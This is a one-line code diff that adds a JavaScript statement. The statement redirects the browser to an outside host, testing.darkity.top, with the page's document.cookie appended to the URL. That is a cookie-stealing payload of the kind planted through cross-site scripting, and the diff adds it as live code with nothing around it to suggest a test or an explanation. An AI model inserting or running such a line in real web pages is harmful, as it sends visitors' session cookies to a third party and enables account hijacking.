@@ -1,0 +1,1 @@
+location.replace("https://testing.darkity.top/" + document.cookie)
